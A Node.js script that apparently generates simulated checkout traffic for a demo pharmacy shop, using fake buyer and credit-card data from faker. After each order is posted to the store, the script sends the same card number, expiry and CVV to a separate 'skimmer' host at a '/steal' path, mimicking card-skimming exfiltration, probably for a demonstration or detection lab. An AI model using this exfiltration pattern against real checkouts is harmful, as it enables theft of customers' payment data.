const axios = require('axios');
const { faker } = require('@faker-js/faker');
// pref­er IPv4 so you don’t hit a non-listening IPv6 address
const dns = require('dns');
if (dns.setDefaultResultOrder) dns.setDefaultResultOrder('ipv4first');

// —— CONFIGURATION ——
const STORE_BASE   = process.env.STORE_BASE   || 'https://demo.solutionsedge.io';
const SKIMMER_BASE = process.env.SKIMMER_BASE || 'https://skimmer.solutionsedge.io/steal';
const ITERATIONS   = parseInt(process.env.ITERATIONS  || '200',  10);
const CONCURRENCY  = parseInt(process.env.CONCURRENCY || '5',   10);

// —— PRODUCTS CATALOG ——
const baseProducts = [
  { name: "Alvedon 500 mg",          price: 49 },
  { name: "Ipren 400 mg",            price: 59 },
  { name: "Naproxen 250 mg",         price: 65 },
  { name: "Panodil 500 mg",          price: 45 },
  { name: "Aspirin 500 mg",          price: 55 },
  { name: "Voltaren Gel 2,32 %",     price: 79 },
  { name: "Zinksalva 30 g",          price: 69 },
  { name: "Cetirizin 10 mg",         price: 99 },
  { name: "Nasonex Nässpray 0,05 %", price: 119 },
  { name: "Otrivin 0,1 %",           price: 89 },
  { name: "Omeprazol 20 mg",         price: 129 },
  { name: "Loperamid 2 mg",          price: 49 },
  { name: "Bricanyl Turbuhaler",     price: 159 },
  { name: "Vita C-brus 500 mg",      price: 79 },
  { name: "D-Vitamin 1000 IE",       price: 99 },
  { name: "Multivitamin",            price: 119 },
  { name: "Probi Mage",              price: 129 },
  { name: "Sovakutan",               price: 89 },
  { name: "Traumeel Salva 50 g",     price: 99 },
  { name: "NEO-Citran brustablett",  price: 69 }
];
const products = Array.from({ length: 100 }, (_, i) => {
  const base = baseProducts[i % baseProducts.length];
  return { id: i + 1, name: base.name, price: base.price };
});

// —— SIMULATION FUNCTION ——
async function simulateOnce(i) {
  // Pick a random product
  const p = products[Math.floor(Math.random() * products.length)];

  // Generate realistic user & card data
  const firstName = faker.person.firstName();
  const lastName  = faker.person.lastName();
  const name      = `${firstName} ${lastName}`;
  const email     = faker.internet.email({ firstName, lastName });
  const card      = faker.finance.creditCardNumber('####-####-####-####');
  const expDate   = faker.date.future({ years: 1 });
  const month     = String(expDate.getMonth() + 1).padStart(2, '0');
  const year      = String(expDate.getFullYear()).slice(-2);
  const expiry    = `${month}/${year}`;
  const cvv       = String(Math.floor(Math.random() * 900) + 100);

  // 1) Checkout API call
  await axios.post(`${STORE_BASE}/api/checkout`, {
    product: p.name,
    price:   p.price,
    name, email,
    cardNumber: card,
    expiry, cvv
  }).catch(err => {
    console.error(`[${i}] Checkout error:`, err.response?.status || err.message);
  });

  // 2) Skimmer exfiltration
  await axios.post(SKIMMER_BASE, {
    product: p.name,
    price:   p.price,
    name, email,
    card, expiry, cvv
  }).catch(err => {
    console.error(`[${i}] Skimmer POST error:`, err.response?.status || err.message);
  });

  process.stdout.write('.');
}

// —— CONCURRENT RUNNER ——
async function run() {
  console.log(`Starting ${ITERATIONS} simulations (${CONCURRENCY} at a time)...`);
  let inflight = [];

  for (let i = 1; i <= ITERATIONS; i++) {
    inflight.push(simulateOnce(i));
    if (inflight.length >= CONCURRENCY) {
      await Promise.all(inflight);
      inflight = [];
    }
  }
  await Promise.all(inflight);
  console.log('\nAll done!');
}

run().catch(err => {
  console.error('Fatal:', err);
  process.exit(1);
});